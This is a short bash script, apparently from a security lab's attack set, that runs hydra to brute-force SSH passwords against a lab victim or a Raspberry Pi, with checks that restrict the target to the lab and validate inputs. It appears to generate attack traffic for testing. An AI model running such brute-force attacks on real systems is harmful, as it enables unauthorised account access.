#!/usr/bin/env bash
# SSH brute force (hydra ssh://) against the lab victim or the Pi. Attacker host only.
#   bash lab/attacks/hydra_ssh.sh --target <pi-or-victim-ip> --pi-ip IP --victim-net CIDR --protected-net CIDR \
#        --wordlist FILE [--user labuser] [--tasks 4] [--duration 60] [--dry-run]
source "$(dirname "${BASH_SOURCE[0]}")/_common.sh"
parse_common "$@"
USER_NAME=labuser
TASKS=4
WORDLIST=""
set -- "${REST[@]}"
while (($#)); do
  case "$1" in
    --user) USER_NAME="${2:?}"; shift ;;
    --tasks) TASKS="${2:?}"; shift ;;
    --wordlist) WORDLIST="${2:?}"; shift ;;
    *) no_extra_args "$@" ;;
  esac
  shift
done
require_lab_target
require_number "$TASKS" "--tasks"
[[ "$USER_NAME" =~ ^[A-Za-z0-9_.-]{1,32}$ ]] || refuse "--user $USER_NAME is not a plain user name"
[[ -n "$WORDLIST" ]] || refuse "--wordlist FILE is required"
(( DRY_RUN )) || [[ -r "$WORDLIST" ]] || refuse "--wordlist $WORDLIST is not readable"
tool_version hydra
run_attack hydra -I -t "$TASKS" -l "$USER_NAME" -P "$WORDLIST" "ssh://${DEST}"
